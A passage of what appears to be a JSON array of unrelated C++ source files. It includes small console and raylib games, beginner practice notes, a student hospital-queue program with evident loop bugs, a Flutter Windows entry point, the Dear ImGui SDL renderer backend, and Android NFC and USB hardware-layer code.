fruit.draw();\r\n            page = 1-page;\r\n            delay(100);\r\n    }\r\n\r\n    getch();\r\n    closegraph();\r\n}\r\n\r\n\r\n\r\n",
    "#include <iostream>\n\nclass Player {\nprivate:\n    char id;\n\npublic:\n    Player(char id) { this->id = id; }\n    char getID() const { return id; }\n};\n\nclass Game {\nprivate:\n    char gameBoard[3][3];\n\npublic:\n    Game() {\n        for (int i = 0; i < 3; i++) {\n            for (int j = 0; j < 3; j++) {\n                gameBoard[i][j] = ' ';\n            }\n        }\n    }\n\n    void displayGameBoard() {\n        std::cout << \"  A   B   C\\n\";\n        std::cout << \"1[\" << gameBoard[0][0] << \"] [\" << gameBoard[0][1] << \"] [\" << gameBoard[0][2] << \"]\\n\";\n        std::cout << \"2[\" << gameBoard[1][0] << \"] [\" << gameBoard[1][1] << \"] [\" << gameBoard[1][2] << \"]\\n\";\n        std::cout << \"3[\" << gameBoard[2][0] << \"] [\" << gameBoard[2][1] << \"] [\" << gameBoard[2][2] << \"]\\n\";\n    }\n\n    void selectPosition(Player* player, char col, int row) {\n        int coli;\n        if (col == 'A') {\n            coli = 0;\n        } else if (col == 'B') {\n            coli = 1;\n        } else if (col == 'C') {\n            coli = 2;\n        } else {\n            std::cerr << \"Invalid input\\n\";\n            return;\n        }\n\n        if (gameBoard[row - 1][coli] == ' ') {\n            gameBoard[row - 1][coli] = player->getID();\n        } else {\n            std::cerr << \"Invalid input\\n\";\n            return;\n        }\n\n        displayGameBoard();\n    }\n\n    bool gameWon(Player* player) {\n        char id = player->getID();\n        // Check rows\n        for (int i = 0; i < 3; i++) {\n            if (gameBoard[i][0] == id && gameBoard[i][1] == id && gameBoard[i][2] == id) {\n                std::cout << \"\\n\" << player->getID() << \" Wins!\\n\";\n                return true;\n            }\n        }\n\n        // Check columns\n        for (int i = 0; i < 3; i++) {\n            if (gameBoard[0][i] == id && gameBoard[1][i] == id && gameBoard[2][i] == id) {\n                std::cout << \"\\n\" << player->getID() << \" Wins!\\n\";\n                return true;\n            }\n        }\n\n        // Check diagonals\n        if (gameBoard[0][0] == id && gameBoard[1][1] == id && gameBoard[2][2] == id) {\n            std::cout << \"\\n\" << player->getID() << \" Wins!\\n\";\n            return true;\n        }\n        if (gameBoard[0][2] == id && gameBoard[1][1] == id && gameBoard[2][0] == id) {\n            std::cout << \"\\n\" << player->getID() << \" Wins!\\n\";\n            return true;\n        }\n\n        return false;\n    }\n\n    bool isDraw() {\n        for (int i = 0; i < 3; i++) {\n            for (int j = 0; j < 3; j++) {\n                if (gameBoard[i][j] == ' ') {\n                    return false;\n                }\n            }\n        }\n        std::cout << \"The game is a draw!\\n\";\n        return true;\n    }\n};\n\nint main() {\n    char id1, id2;\n\n    std::cout << \"Player 1, enter your character ID: \";\n    std::cin >> id1;\n    do {\n        std::cout << \"Player 2, enter your unique character ID: \";\n        std::cin >> id2;\n        if (id2 == id1) {\n            std::cerr << \"Character ID must be unique.\\n\";\n        }\n    } while (id2 == id1);\n\n    Player* player1 = new Player(id1);\n    Player* player2 = new Player(id2);\n    Player* currentPlayer = player2;\n    Game* currentGame = new Game();\n    bool gameOver = false;\n\n    currentGame->displayGameBoard();\n\n    std::cout << \"Input \\\"Column Row\\\" (A 1, B 2, C 3)\\n\";\n\n    while (!gameOver) {\n        if (currentPlayer == player1) {\n            currentPlayer = player2;\n        } else {\n            currentPlayer = player1;\n        }\n\n        std::cout << \"\\nInput \" << currentPlayer->getID() << \": \";\n        char col;\n        int row;\n        std::cin >> col >> row;\n        currentGame->selectPosition(currentPlayer, col, row);\n        if (currentGame->gameWon(currentPlayer)) {\n            gameOver = true;\n        } else if (currentGame->isDraw()) {\n            gameOver = true;\n        }\n    }\n\n    delete currentGame;\n    delete player1;\n    delete player2;\n\n    return 0;\n}\n\n",
    "#include <iostream>\n#include <vector>\n\n\ntypedef std::string text_t;\ntypedef int number_t;\n\n// alternative solutions\n// keyword \"USING\"\nusing text_t = std::string;\nusing number_t = int;\n\nint main() {\n    // number_t age = 19;\n    // text_t firstName = \"Bro\";\n    // std::cout << firstName << \" just \" << age << \" but is great\";\n\n//    integer (whole number)\n//    int age = 21;\n//    int year = 2024;\n//    int gpa = 3.9;\n\n//    double (number including decimal)\n    double dollar = 24.7;\n\n// char (a single character)\n    // char grade = 'A';\n\n\n// boolean (true or false)\nbool forSale = true;\n\n// string (objects that represents a sequence of text)\n    // std::string name = \"dustin\";\n    // std::cout << name << \" is \" << age << \" years old\";\n\n\n    const double pi = 3.14159;\n    double radius = 10;\n    double circumference = 2 * pi * radius;\n    // std::cout << circumference << \" cm\";\n\n \n//   int correct = 8;\n//   int question = 10;\n//   double score = (double)correct/question *100;\n  \n//   std::cout << score << \"%\";\n\n//   std::string name;\n//   int age;  \n\n//   std::cout << \"What's your full name ? \";\n//   std::getline(std::cin, name);     \n//     //   get in line (parentheses) (that could contain spaces)\n    \n// //   std::cin >> name; \n// //   (only one name can be used );\n\n//  std::cout << \"What's your age ? \";\n//  std::cin >> age;\n\n//   std::cout << \"Hi \" << name << '\\n';\n//   std::cout << \"You're \" << age << \" years old\";\n\n\n\n//    namespace first {\n//     int x = 1;\n//    }\n//    namespace second {\n//     int x = 2;\n//    }\n\n//    int main() {\n//     int x = 0;\n//     using namespace first;\n//     std::cout << second::x;\n//     // double colon /kou lan/ is strong than \"using\"\n//    }\n\n\n// int age;\n// std::cout << \"Enter your age\";\n// std::cin >> age;\n\n// if (age >= 100) {\n//     std::cout << \"You're too old to enter this!\";\n// }\n\n// else if(age >= 18) {\n//     std::cout << \"Welcome to our site.\";\n// }\n\n// else if(age <= 0) {\n//     std::cout << \"You haven't been born yet!\";\n// }\n\n// else {\n//     std::cout << \"You're not old enough to enter\";\n// }\n\n\n\n\n// int month;\n// std::cout << \"Enter the month (1 - 12)\";\n// std::cin >> month;\n\n\n// char grade;\n// std::cout << \"What's your letter grade (A - F) ? \";\n// std::cin >> grade;\n\n\n// // letter grade\n// switch (grade)\n// {\n// case 'A':\n//     std::cout << \"You did great.\";\n//     break;\n\n// case 'B':\n//     std::cout << \"You did good.\";\n//     break;\n    \n// case 'C':\n//     std::cout << \"You did OK.\";\n//     break;\n    \n// case 'D':\n//     std::cout << \"You did not do good.\";\n//     break;\n    \n// case 'F':\n//     std::cout << \"You failed.\";\n//     break;\n// default: std::cout << \"Please only enter your letter grade.\";\n  \n// }\n\n\n\n\n\n// char operators;\n// double number1;\n// double number2;\n// double result;\n\n// std::cout << \"**********************************CALCULATOR*****************************************\\n\";\n\n// std::cout << \"Enter either (+ - * /) \";\n// std::cin >> operators;\n\n// std::cout << \"Enter number #1: \";\n// std::cin >> number1;\n\n\n// std::cout << \"Enter number #2: \";\n// std::cin >> number2;\n\n// switch (operators)\n// {\n// case '+':\n//     result = number1 + number2;\n//     std::cout << \"Result: \" << result << '\\n';\n//     break;\n\n\n// case '-':\n//     result = number1 - number2;\n//     std::cout << \"Result: \" << result << '\\n';\n//     break;\n\n    \n// case '*':\n//     result = number1 * number2;\n//     std::cout << \"Result: \" << result << '\\n';\n//     break;\n\n    \n// case '/':\n//     result = number1 / number2;\n//     std::cout << \"Result: \" << result << '\\n';\n//     break;\n\n// default: \n//     std::cout << \"That wasn't a valid response.\\n\";\n//     break;\n// }\n\n\n\n\nint number = 15;\n// way 1\n// number % 3 ? std::cout << \"ODD\" : std::cout << \"EVEN\";\n\n// way 2\n// std::cout << (number % 3 ? \"ODD\" : \"EVEN\");\n\n\nbool hungry = false;\n\n// way 1\n// std::cout << (hungry ? \"You're hungry\" : \"You're full\");\n\n// way 2\n// hungry ? std::cout << \"You're starving\" : std::cout << \"You're stuffed\";\n\n\n\n\n\n\nreturn 0;\n}\n\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"techdev\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <raylib.h>\n\nint score1 = 0;\nint score2 = 0;\n\nclass Ball {\npublic:\n  float x;\n  float y;\n  float radius;\n  int v_x = 8, v_y = 8;\n\n  Ball(int x, int y, int radius) {\n    this->x = x;\n    this->y = y;\n    this->radius = radius;\n  }\n\n  void draw() { DrawCircle(x, y, radius, WHITE); }\n\n  void update() {\n    if (x + radius >= GetScreenWidth()) {\n      v_x = -v_x;\n      score1++;\n    }\n    if (x - radius <= 0) {\n      v_x = -v_x;\n      score2++;\n    }\n    if (y + radius >= GetScreenHeight() || y - radius <= 0) {\n      v_y = -v_y;\n    }\n    x = x + v_x;\n    y = y + v_y;\n  }\n};\n\nclass Bar {\npublic:\n  float x, y;\n  float height, width;\n  const int speed = 5;\n  int up_key;\n  int down_key;\n\n  Bar(int x, int y, int width, int height, int up_key, int down_key) {\n    this->x = x;\n    this->y = y;\n    this->width = width;\n    this->height = height;\n    this->up_key = up_key;\n    this->down_key = down_key;\n  }\n\n  void draw() {\n    DrawRectangleRounded(Rectangle{x, y, width, height}, 1, 10, WHITE);\n  }\n\n  void update() {\n    if (IsKeyDown(up_key) && y >= 5) {\n      if (y - speed >= 5) {\n        y = y - speed;\n      } else {\n        y = 5;\n      }\n    }\n    if (IsKeyDown(down_key) && y + height <= GetScreenHeight() - 5) {\n      if (y + speed <= GetScreenHeight() - height - 5) {\n        y = y + speed;\n      } else {\n        y = GetScreenHeight() - height - 5;\n      }\n    }\n  }\n};\n\nvoid drawScore(void) {\n  DrawText(TextFormat(\"%i\", score1), GetScreenWidth() / 4 - 40 / 2, 40, 40,\n           WHITE);\n  DrawText(TextFormat(\"%i\", score2), 3 * GetScreenWidth() / 4 - 40 / 2, 40, 40,\n           WHITE);\n}\n\nvoid checkCollisionsBallBar(Ball &ball, Bar &bar1, Bar &bar2) {\n  if (CheckCollisionCircleRec(\n          Vector2{(float)ball.x, (float)ball.y}, ball.radius,\n          Rectangle{(float)bar1.x, (float)bar1.y, (float)bar1.width,\n                    (float)bar1.height})) {\n    if (ball.x - ball.radius <= bar1.x + bar1.width) {\n      ball.x = bar1.x + bar1.width + ball.radius;\n    }\n    ball.v_x = -ball.v_x;\n  }\n\n  if (CheckCollisionCircleRec(\n          Vector2{(float)ball.x, (float)ball.y}, ball.radius,\n          Rectangle{(float)bar2.x, (float)bar2.y, (float)bar2.width,\n                    (float)bar2.height})) {\n    if (ball.x + ball.radius >= GetScreenWidth() - bar2.width) {\n      ball.x = bar2.x - bar2.width - ball.radius;\n    }\n    ball.v_x = -ball.v_x;\n  }\n}\n\nvoid drawField(void) {\n  float center_x = GetScreenWidth() / 2.0f;\n  float center_y = GetScreenHeight() / 2.0f;\n  ClearBackground(DARKGREEN);\n  DrawRectangle(center_x, 0, 2 * center_x, 2 * center_y, LIME);\n  DrawCircle(center_x, center_y, 75, LIME);\n  DrawCircleSector(Vector2{center_x, center_y}, 75, 90, -90, 80, DARKGREEN);\n  DrawLine(center_x, 0, center_x, 2 * center_y, WHITE);\n}\n\nint main() {\n  std::cout << \"Hello World!\" << std::endl;\n\n  const int width = 640;\n  const int height = 420;\n\n  InitWindow(width, height, \"Pong\");\n  SetTargetFPS(60);\n\n  Ball ball = Ball(width / 2, height / 2, 8);\n\n  int barWidth = 15;\n  int barHeight = 80;\n  int barDisplacement = 5;\n  Bar bar1 = Bar(barDisplacement, height / 2 - barHeight / 2, barWidth,\n                 barHeight, KEY_UP, KEY_DOWN);\n  Bar bar2 = Bar(width - barDisplacement - barWidth, height / 2 - barHeight / 2,\n                 barWidth, barHeight, KEY_K, KEY_J);\n\n  while (WindowShouldClose() == false) {\n    BeginDrawing();\n    // draw field\n    drawField();\n\n    // draw and update ball end bars\n    ball.draw();\n    ball.update();\n\n    bar1.update();\n    bar1.draw();\n\n    bar2.update();\n    bar2.draw();\n\n    // check for collisions\n    checkCollisionsBallBar(ball, bar1, bar2);\n\n    // draw score\n    drawScore();\n\n    EndDrawing();\n\n    if (IsKeyPressed(KEY_T)) {\n      TakeScreenshot(\"screenshot.png\");\n    }\n  }\n\n  CloseWindow();\n  return 0;\n}",
    "// dear imgui: Renderer Backend for SDL_Renderer for SDL2\n// (Requires: SDL 2.0.17+)\n\n// Note how SDL_Renderer is an _optional_ component of SDL2.\n// For a multi-platform app consider using e.g. SDL+DirectX on Windows and SDL+OpenGL on Linux/OSX.\n// If your application will want to render any non trivial amount of graphics other than UI,\n// please be aware that SDL_Renderer currently offers a limited graphic API to the end-user and\n// it might be difficult to step out of those boundaries.\n\n// Implemented features:\n//  [X] Renderer: User texture binding. Use 'SDL_Texture*' as ImTextureID. Read the FAQ about ImTextureID!\n//  [X] Renderer: Large meshes support (64k+ vertices) with 16-bit indices.\n\n// You can copy and use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n// CHANGELOG\n//  2023-05-30: Renamed imgui_impl_sdlrenderer.h/.cpp to imgui_impl_sdlrenderer2.h/.cpp to accommodate for upcoming SDL3.\n//  2022-10-11: Using 'nullptr' instead of 'NULL' as per our switch to C++11.\n//  2021-12-21: Update SDL_RenderGeometryRaw() format to work with SDL 2.0.19.\n//  2021-12-03: Added support for large mesh (64K+ vertices), enable ImGuiBackendFlags_RendererHasVtxOffset flag.\n//  2021-10-06: Backup and restore modified ClipRect/Viewport.\n//  2021-09-21: Initial version.\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include \"imgui_impl_sdlrenderer2.h\"\n#include <stdint.h>     // intptr_t\n\n// Clang warnings with -Weverything\n#if defined(__clang__)\n#pragma clang diagnostic push\n#pragma clang diagnostic ignored \"-Wsign-conversion\"    // warning: implicit conversion changes signedness\n#endif\n\n// SDL\n#include <SDL.h>\n#if !SDL_VERSION_ATLEAST(2,0,17)\n#error This backend requires SDL 2.0.17+ because of SDL_RenderGeometry() function\n#endif\n\n// SDL_Renderer data\nstruct ImGui_ImplSDLRenderer2_Data\n{\n    SDL_Renderer*   SDLRenderer;\n    SDL_Texture*    FontTexture;\n    ImGui_ImplSDLRenderer2_Data() { memset((void*)this, 0, sizeof(*this)); }\n};\n\n// Backend data stored in io.BackendRendererUserData to allow support for multiple Dear ImGui contexts\n// It is STRONGLY preferred that you use docking branch with multi-viewports (== single Dear ImGui context + multiple windows) instead of multiple Dear ImGui contexts.\nstatic ImGui_ImplSDLRenderer2_Data* ImGui_ImplSDLRenderer2_GetBackendData()\n{\n    return ImGui::GetCurrentContext() ? (ImGui_ImplSDLRenderer2_Data*)ImGui::GetIO().BackendRendererUserData : nullptr;\n}\n\n// Functions\nbool ImGui_ImplSDLRenderer2_Init(SDL_Renderer* renderer)\n{\n    ImGuiIO& io = ImGui::GetIO();\n    IM_ASSERT(io.BackendRendererUserData == nullptr && \"Already initialized a renderer backend!\");\n    IM_ASSERT(renderer != nullptr && \"SDL_Renderer not initialized!\");\n\n    // Setup backend capabilities flags\n    ImGui_ImplSDLRenderer2_Data* bd = IM_NEW(ImGui_ImplSDLRenderer2_Data)();\n    io.BackendRendererUserData = (void*)bd;\n    io.BackendRendererName = \"imgui_impl_sdlrenderer2\";\n    io.BackendFlags |= ImGuiBackendFlags_RendererHasVtxOffset;  // We can honor the ImDrawCmd::VtxOffset field, allowing for large meshes.\n\n    bd->SDLRenderer = renderer;\n\n    return true;\n}\n\nvoid ImGui_ImplSDLRenderer2_Shutdown()\n{\n    ImGui_ImplSDLRenderer2_Data* bd = ImGui_ImplSDLRenderer2_GetBackendData();\n    IM_ASSERT(bd != nullptr && \"No renderer backend to shutdown, or already shutdown?\");\n    ImGuiIO& io = ImGui::GetIO();\n\n    ImGui_ImplSDLRenderer2_DestroyDeviceObjects();\n\n    io.BackendRendererName = nullptr;\n    io.BackendRendererUserData = nullptr;\n    io.BackendFlags &= ~ImGuiBackendFlags_RendererHasVtxOffset;\n    IM_DELETE(bd);\n}\n\nstatic void ImGui_ImplSDLRenderer2_SetupRenderState()\n{\n\tImGui_ImplSDLRenderer2_Data* bd = ImGui_ImplSDLRenderer2_GetBackendData();\n\n\t// Clear out any viewports and cliprect set by the user\n    // FIXME: Technically speaking there are lots of other things we could backup/setup/restore during our render process.\n\tSDL_RenderSetViewport(bd->SDLRenderer, nullptr);\n\tSDL_RenderSetClipRect(bd->SDLRenderer, nullptr);\n}\n\nvoid ImGui_ImplSDLRenderer2_NewFrame()\n{\n    ImGui_ImplSDLRenderer2_Data* bd = ImGui_ImplSDLRenderer2_GetBackendData();\n    IM_ASSERT(bd != nullptr && \"Did you call ImGui_ImplSDLRenderer2_Init()?\");\n\n    if (!bd->FontTexture)\n        ImGui_ImplSDLRenderer2_CreateDeviceObjects();\n}\n\nvoid ImGui_ImplSDLRenderer2_RenderDrawData(ImDrawData* draw_data)\n{\n\tImGui_ImplSDLRenderer2_Data* bd = ImGui_ImplSDLRenderer2_GetBackendData();\n\n\t// If there's a scale factor set by the user, use that instead\n    // If the user has specified a scale",
    "/******************************************************************************\n *\n *  Copyright 2018-2019 NXP\n *\n *  Licensed under the Apache License, Version 2.0 (the \"License\");\n *  you may not use this file except in compliance with the License.\n *  You may obtain a copy of the License at\n *\n *  http://www.apache.org/licenses/LICENSE-2.0\n *\n *  Unless required by applicable law or agreed to in writing, software\n *  distributed under the License is distributed on an \"AS IS\" BASIS,\n *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n *  See the License for the specific language governing permissions and\n *  limitations under the License.\n *\n ******************************************************************************/\n#define LOG_TAG \"android.hardware.nfc@1.2-impl\"\n#include <log/log.h>\n#include \"Nfc.h\"\n#include \"halimpl/inc/phNxpNciHal_Adaptation.h\"\n#include \"phNfcStatus.h\"\n\n#define CHK_STATUS(x) ((x) == NFCSTATUS_SUCCESS) \\\n      ? (V1_0::NfcStatus::OK) : (V1_0::NfcStatus::FAILED)\n\nextern bool nfc_debug_enabled;\n\nnamespace android {\nnamespace hardware {\nnamespace nfc {\nnamespace V1_2 {\nnamespace implementation {\n\nsp<V1_1::INfcClientCallback> Nfc::mCallbackV1_1 = nullptr;\nsp<V1_0::INfcClientCallback> Nfc::mCallbackV1_0 = nullptr;\n\nReturn<V1_0::NfcStatus> Nfc::open_1_1(\n    const sp<V1_1::INfcClientCallback>& clientCallback) {\n  if (clientCallback == nullptr) {\n    ALOGD_IF(nfc_debug_enabled, \"Nfc::open null callback\");\n    return V1_0::NfcStatus::FAILED;\n  } else {\n    mCallbackV1_1 = clientCallback;\n    mCallbackV1_1->linkToDeath(this, 0 /*cookie*/);\n  }\n  return open(clientCallback);\n}\n\n// Methods from ::android::hardware::nfc::V1_0::INfc follow.\nReturn<V1_0::NfcStatus> Nfc::open(\n    const sp<V1_0::INfcClientCallback>& clientCallback) {\n  ALOGD_IF(nfc_debug_enabled, \"Nfc::open Enter\");\n  if (clientCallback == nullptr) {\n    ALOGD_IF(nfc_debug_enabled, \"Nfc::open null callback\");\n    return V1_0::NfcStatus::FAILED;\n  } else {\n    mCallbackV1_0 = clientCallback;\n    mCallbackV1_0->linkToDeath(this, 0 /*cookie*/);\n  }\n\n  NFCSTATUS status = phNxpNciHal_open(eventCallback, dataCallback);\n  ALOGD_IF(nfc_debug_enabled, \"Nfc::open Exit\");\n  return CHK_STATUS(status);\n}\n\nReturn<uint32_t> Nfc::write(const hidl_vec<uint8_t>& data) {\n  hidl_vec<uint8_t> copy = data;\n  return phNxpNciHal_write(copy.size(), &copy[0]);\n}\n\nReturn<V1_0::NfcStatus> Nfc::coreInitialized(const hidl_vec<uint8_t>& data) {\n  hidl_vec<uint8_t> copy = data;\n  NFCSTATUS status = phNxpNciHal_core_initialized(copy.size(), &copy[0]);\n  return CHK_STATUS(status);\n}\n\nReturn<V1_0::NfcStatus> Nfc::prediscover() {\n  NFCSTATUS status = phNxpNciHal_pre_discover();\n  return CHK_STATUS(status);\n}\n\nReturn<V1_0::NfcStatus> Nfc::close() {\n  if (mCallbackV1_1 == nullptr && mCallbackV1_0 == nullptr) {\n    return V1_0::NfcStatus::FAILED;\n  }\n  NFCSTATUS status = phNxpNciHal_close(false);\n\n  if (mCallbackV1_1 != nullptr) {\n    mCallbackV1_1->unlinkToDeath(this);\n    mCallbackV1_1 = nullptr;\n  }\n  if (mCallbackV1_0 != nullptr) {\n    mCallbackV1_0->unlinkToDeath(this);\n    mCallbackV1_0 = nullptr;\n  }\n  return CHK_STATUS(status);\n}\n\nReturn<V1_0::NfcStatus> Nfc::controlGranted() {\n  NFCSTATUS status = phNxpNciHal_control_granted();\n  return CHK_STATUS(status);\n}\n\nReturn<V1_0::NfcStatus> Nfc::powerCycle() {\n  NFCSTATUS status = phNxpNciHal_power_cycle();\n  return CHK_STATUS(status);\n}\n\n// Methods from ::android::hardware::nfc::V1_1::INfc follow.\nReturn<void> Nfc::factoryReset() {\n  phNxpNciHal_do_factory_reset();\n  return Void();\n}\n\nReturn<V1_0::NfcStatus> Nfc::closeForPowerOffCase() {\n  if (mCallbackV1_1 == nullptr && mCallbackV1_0 == nullptr) {\n    return V1_0::NfcStatus::FAILED;\n  }\n  NFCSTATUS status = phNxpNciHal_configDiscShutdown();\n\n  if (mCallbackV1_1 != nullptr) {\n    mCallbackV1_1->unlinkToDeath(this);\n    mCallbackV1_1 = nullptr;\n  }\n  if (mCallbackV1_0 != nullptr) {\n    mCallbackV1_0->unlinkToDeath(this);\n    mCallbackV1_0 = nullptr;\n  }\n  return CHK_STATUS(status);\n}\n\nReturn<void> Nfc::getConfig(getConfig_cb hidl_cb) {\n  android::hardware::nfc::V1_1::NfcConfig nfcVendorConfig;\n  phNxpNciHal_getVendorConfig(nfcVendorConfig);\n  hidl_cb(nfcVendorConfig);\n  return Void();\n}\n\n// Methods from ::android::hardware::nfc::V1_2::INfc follow.\nReturn<void> Nfc::getConfig_1_2(getConfig_1_2_cb hidl_cb) {\n  NfcConfig nfcVendorConfig;\n  phNxpNciHal_getVendorConfig_1_2(nfcVendorConfig);\n  hidl_cb(nfcVendorConfig);\n  return Void();\n}\n\n}  // namespace implementation\n}  // namespace V1_2\n}  // namespace nfc\n}  // namespace hardware\n}  // namespace android\n",
    "#include <iostream>\nusing namespace std;\n\nconst int Specializations = 20;\nconst int Queue_length = 5;\n\nstring names[Specializations+1][Queue_length+1];\nint status[Specializations+1][Queue_length+1];\nint counters[21];\nstring spe_names[20] = {\"child\",\"kidney\",\"child surgery\",\"pharmacy part\",\"stomach diseases\",\"heart\",\"nose and throat\",\"dentistry\",\"therapy\",\"women\",\"bones\",\"surgery\",\"internal\",\"dermatology\",\"anatomy\",\"emergency\",\"cardio\",\"mouth \",\"heart surgery\",\"stomach\"};\n\nint  Enterface ()\n{\n    int choice = -1;\n    while (choice == -1)\n    {\n        cout << \"------------------------------\"<<endl;\n        cout << \"|Enter your choice            |\\n\";\n        cout << \"------------------------------\" << endl;\n        cout << \"|1) Add a new patient         |\\n\";\n        cout << \"------------------------------\" << endl;\n        cout << \"|2) Print all the patients    |\\n\";\n        cout << \"------------------------------\" << endl;\n        cout << \"|3) Get the next patient      |\\n\";\n        cout << \"------------------------------\" << endl;\n        cout << \"|4) Exist                     |\\n\";\n        cout << \"------------------------------\"<<endl;;\n        cin >> choice;\n        if (choice > 4 || choice < 0)\n        {\n            cout << \"Invalid choice , try again \\n\";\n            choice = -1;//to make it equal the first value\n        }\n    }\n    return choice;\n}\nvoid shift_to_right(int spe,string name[],int stat[])\n{\n    int len = counters[spe];//it is for all specialization \n    for (int i = len-1;i >=0;i++)\n    {\n        name[i+1] = name[i];\n        stat[i+1] = stat[i];\n    }\n    counters[spe]++;//it will help me to add a name to the queue\n}\nvoid shift_to_left(int spe,string name[],int stat[])\n{\n    int len = counters[spe] ;\n    for (int i = 1;i <len;i--)\n    {\n        name[i-1] = name[i];\n        stat[i-1] = stat[i];\n    }\n    counters[spe]--;//it will help me to remove the name from the queue\n\n}\nbool Addpatient()\n{\n    cout << endl;\n    cout << \"specialization , name , status : \";\n    int spe;string name; bool st;\n    cin >> spe >> name >> st;\n   \n    int len=counters[spe];\n   \n    \n    if (len>= Queue_length)\n    {\n        cout << \"Sorry you can not add any other patients to specialization ( \" << spe_names[spe-1]<<\" )\" << endl;\n        return false;\n    }\n    if (st==1)//urgent add to the begin\n    {\n        shift_to_right(spe,names[spe],status[spe]);//to be able to add the value to the first cell\n        names[spe][0] = name;\n        status[spe][0] = st;\n\n    }\n    else// regular add to the end \n    {\n        names[spe][len] = name;\n        status[spe][len] = st;\n        counters[spe]++;\n    }\n    return true;\n}\nvoid print_patient(int spe,string name[],int stat[])\n{\n     int len=counters[spe];//what is the spe\n     if (len == 0)\n         return;\n\n    cout << \"There are  \" << len << \" patients \" << \"in specialization ( \"<<spe_names[spe-1]<<\" ) \" << endl;\n    for (int i=0;i < len;i++)\n    {\n        cout << name[i] << \" \";\n\n        if (stat[i])\n        {\n            cout << \"Urgent\\n\";\n        }\n        else\n        {\n            cout << \"Regular\\n\";\n        }\n        cout << endl;\n    }\n   \n\n}\nvoid print_patients()\n{\n    cout << \"%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\\n\";\n    for (int spe = 0;spe < Specializations;spe++)\n    {\n        print_patient(spe,names[spe],status[spe]);\n    }\n}\nbool get_the_next_patient()\n{\n    int spe; \n    cout << \"Enter the specialization \" << endl;\n    cin >> spe;\n    int len = counters[spe];\n   \n   \n    if (len == 0)\n    {\n        cout << \"there are not current patients in ( \" << spe_names[spe-1]<< \" ) rest ,dr\\n\";\n        return false;\n    }\n    else\n\n    cout << \"the next patient \" << names[spe][0] << \" go to the dr \\n\";\n\n    shift_to_left(spe, names[0], status[0]);// to delete the patient from the queue\n\n}\nvoid l_hopital()\n{\n  \n    while (true)\n    {\n        int choice = Enterface();\n        if (choice == 1)\n        {\n            Addpatient();\n        }\n        else if (choice == 2)\n        {\n            print_patients();\n        }\n        else if (choice == 3)\n        {\n            get_the_next_patient();\n\n        }\n        else\n        {\n            break;\n        }\n    }\n    \n}\nint main()\n{\n    //Practice Makes Perfect\n    l_hopital();\n\n}\n",
    "/*\n * Copyright (C) 2018 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#define LOG_TAG \"android.hardware.usb.gadget@1.1-service.mt6833\"\n\n#include \"UsbGadget.h\"\n#include <dirent.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <sys/inotify.h>\n#include <sys/mount.h>\n#include <sys/stat.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nconstexpr int BUFFER_SIZE = 512;\nconstexpr int MAX_FILE_PATH_LENGTH = 256;\nconstexpr int EPOLL_EVENTS = 10;\nconstexpr bool DEBUG = false;\nconstexpr int DISCONNECT_WAIT_US = 100000;\nconstexpr int PULL_UP_DELAY = 500000;\n\n#define BUILD_TYPE \"ro.build.type\"\n#define GADGET_PATH \"/config/usb_gadget/g1/\"\n#define PULLUP_PATH GADGET_PATH \"UDC\"\n#define GADGET_NAME GetProperty(kGadgetProp, \"\")\n#define PERSISTENT_BOOT_MODE \"ro.bootmode\"\n#define VENDOR_ID_PATH GADGET_PATH \"idVendor\"\n#define PRODUCT_ID_PATH GADGET_PATH \"idProduct\"\n#define DEVICE_CLASS_PATH GADGET_PATH \"bDeviceClass\"\n#define DEVICE_SUB_CLASS_PATH GADGET_PATH \"bDeviceSubClass\"\n#define DEVICE_PROTOCOL_PATH GADGET_PATH \"bDeviceProtocol\"\n#define DESC_USE_PATH GADGET_PATH \"os_desc/use\"\n#define OS_DESC_PATH GADGET_PATH \"os_desc/b.1\"\n#define CONFIG_PATH GADGET_PATH \"configs/b.1/\"\n#define FUNCTIONS_PATH GADGET_PATH \"functions/\"\n#define FUNCTION_NAME \"function\"\n#define FUNCTION_PATH CONFIG_PATH FUNCTION_NAME\n#define RNDIS_PATH FUNCTIONS_PATH \"rndis.gs4\"\n\n#define PERSISTENT_VENDOR_CONFIG \"persist.vendor.usb.usbradio.config\"\n#define VENDOR_CONFIG \"vendor.usb.config\"\n\nnamespace android {\nnamespace hardware {\nnamespace 